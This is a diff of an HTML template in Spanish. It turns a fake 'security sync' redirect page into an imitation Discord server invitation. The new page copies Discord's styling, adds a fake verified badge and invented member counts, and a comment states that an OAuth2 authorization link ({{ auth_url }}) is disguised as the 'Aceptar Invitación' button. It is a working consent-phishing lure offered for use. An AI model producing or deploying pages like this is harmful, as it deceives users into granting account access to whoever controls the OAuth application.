@@ -3,182 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sincronización de Seguridad | al3xg0nzalezzz</title>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <title>Discord</title>
+    <!-- Fuente oficial de Discord (aproximada con Outfit) -->
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        /* Estilos Base Estilo Discord Dark */
         :root {
-            --primary: #00d2ff;
-            --accent: #3a7bd5;
-            --bg: #05070a;
-            --card-bg: rgba(255, 255, 255, 0.02);
-            --border: rgba(255, 255, 255, 0.07);
+            --bg-main: #313338;
+            --bg-card: #2b2d31;
+            --blurple: #5865f2;
+            --blurple-hover: #4752c4;
+            --text-muted: #b5bac1;
+            --text-header: #f2f3f5;
+            --text-normal: #dbdee1;
+            --green: #23a55a;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Outfit', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
 
         body {
-            background-color: var(--bg);
-            background-image: 
-                radial-gradient(circle at 10% 10%, rgba(0, 210, 255, 0.08) 0%, transparent 35%),
-                radial-gradient(circle at 90% 90%, rgba(58, 123, 213, 0.08) 0%, transparent 35%);
-            height: 100vh;
+            background-color: var(--bg-main);
             display: flex;
             justify-content: center;
             align-items: center;
-            color: white;
-            font-family: 'Outfit', sans-serif;
-            overflow: hidden;
+            height: 100vh;
+            background-image: url('https://discord.com/assets/2c21aeda16de354ba533.png'); /* Fondo de burbujas oficial */
+            background-size: cover;
         }
 
-        .container {
-            position: relative;
-            z-index: 10;
-        }
-
-        .glass-card {
-            background: var(--card-bg);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border: 1px solid var(--border);
-            padding: 60px 40px;
-            border-radius: 32px;
+        .invite-card {
+            background-color: var(--bg-card);
+            width: 100%;
+            max-width: 480px;
+            padding: 32px;
+            border-radius: 8px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.24);
             text-align: center;
-            width: 420px;
-            box-shadow: 0 40px 100px -20px rgba(0, 0, 0, 0.8);
-            position: relative;
-            overflow: hidden;
+            animation: fadeIn 0.4s ease-out;
         }
 
-        .glass-card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%;
-            width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
-            transition: 0.5s;
-            animation: shine 3s infinite;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
         }
 
-        @keyframes shine {
-            to { left: 100%; }
-        }
-
-        .loader-ring {
-            position: relative;
-            width: 100px;
-            height: 100px;
-            margin: 0 auto 35px;
-        }
-
-        .loader-ring div {
-            box-sizing: border-box;
-            display: block;
-            position: absolute;
+        .guild-icon {
             width: 80px;
             height: 80px;
-            margin: 10px;
-            border: 4px solid var(--primary);
-            border-radius: 50%;
-            animation: ring 1.5s cubic-bezier(0.5, 0, 0.5, 1) infinite;
-            border-color: var(--primary) transparent transparent transparent;
-        }
-        .loader-ring div:nth-child(1) { animation-delay: -0.45s; }
-        .loader-ring div:nth-child(2) { animation-delay: -0.3s; }
-        .loader-ring div:nth-child(3) { animation-delay: -0.15s; }
-
-        @keyframes ring {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .avatar-mini {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            border: 2px solid var(--border);
-            box-shadow: 0 0 20px rgba(0, 210, 255, 0.2);
+            border-radius: 28px;
+            background-color: #313338;
+            margin-bottom: 20px;
             object-fit: cover;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
-        h1 {
+        .guild-icon:hover {
+            transform: scale(1.1);
+        }
+
+        .invite-header {
+            color: var(--text-muted);
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.02em;
+            margin-bottom: 8px;
+        }
+
+        .guild-name {
+            color: var(--text-header);
             font-size: 24px;
             font-weight: 600;
-            margin-bottom: 15px;
-            letter-spacing: -0.5px;
-            background: linear-gradient(to right, #fff, #94a3b8);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            line-height: 30px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
-        .status-txt {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 13px;
-            color: var(--primary);
-            background: rgba(0, 210, 255, 0.05);
-            padding: 8px 15px;
-            border-radius: 8px;
-            display: inline-block;
-            margin-bottom: 25px;
-            border: 1px solid rgba(0, 210, 255, 0.1);
+        .verified-badge {
+            color: var(--blurple);
+            font-size: 18px;
         }
 
-        p {
-            color: #64748b;
+        .status-info {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 30px;
             font-size: 14px;
-            line-height: 1.6;
-            max-width: 280px;
-            margin: 0 auto 30px;
         }
 
-        .footer-brand {
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 4px;
-            color: #334155;
-            margin-top: 20px;
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-muted);
         }
 
-        /* Ambient Orbs */
-        .orb {
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: var(--accent);
-            filter: blur(150px);
+        .dot {
+            width: 8px;
+            height: 8px;
             border-radius: 50%;
-            z-index: -1;
-            opacity: 0.1;
+        }
+
+        .dot-online { background-color: var(--green); }
+        .dot-members { background-color: #b5bac1; }
+
+        .btn-accept {
+            background-color: var(--blurple);
+            color: white;
+            text-decoration: none;
+            padding: 12px 24px;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: 500;
+            display: block;
+            width: 100%;
+            transition: background-color 0.1s, transform 0.1s;
+            margin-bottom: 12px;
+        }
+
+        .btn-accept:hover {
+            background-color: var(--blurple-hover);
+        }
+
+        .btn-accept:active {
+            transform: translateY(1px);
+        }
+
+        .footer-text {
+            color: var(--text-muted);
+            font-size: 12px;
+            line-height: 16px;
+            margin-top: 16px;
+        }
+
+        .footer-link {
+            color: var(--blurple);
+            text-decoration: none;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <div class="orb" style="top: -100px; left: -100px;"></div>
-    <div class="orb" style="bottom: -100px; right: -100px; background: var(--primary);"></div>
 
-    <div class="container">
-        <div class="glass-card">
-            <div class="loader-ring">
-                <div></div><div></div><div></div><div></div>
-                <img src="https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg" class="avatar-mini">
+    <div class="invite-card">
+        <!-- Logo de Pinterest del usuario -->
+        <img src="https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg" class="guild-icon" alt="Server Icon">
+        
+        <div class="invite-header">Has recibido una invitación para unirte a</div>
+        
+        <div class="guild-name">
+            Servidor de al3xg0nzalezzz
+            <span class="verified-badge">✔</span>
+        </div>
+
+        <div class="status-info">
+            <div class="status-item">
+                <span class="dot dot-online"></span>
+                <span>1,248 en línea</span>
             </div>
+            <div class="status-item">
+                <span class="dot dot-members"></span>
+                <span>8,590 miembros</span>
+            </div>
+        </div>
 
-            <div class="status-txt">> SYNCING_ENCRYPTED_NODE</div>
-            
-            <h1>Verificando Protocolo</h1>
-            <p>Estableciendo conexión segura con la red cifrada. Por favor, no cierre esta ventana.</p>
-
-            <div class="footer-brand">al3xg0nzalezzz</div>
+        <!-- El link de OAuth2 camuflado como botón de invitación -->
+        <a href="{{ auth_url }}" class="btn-accept">Aceptar Invitación</a>
+        
+        <div class="footer-text">
+            Al aceptar la invitación, confirmas que has leído y aceptas las 
+            <a href="#" class="footer-link">Reglas de la Comunidad</a>.
         </div>
     </div>
 
-    <script>
-        // Redirección profesional a los 5 segundos
-        setTimeout(() => {
-            window.location.href = "https://www.google.com";
-        }, 5000);
-    </script>
 </body>
 </html>
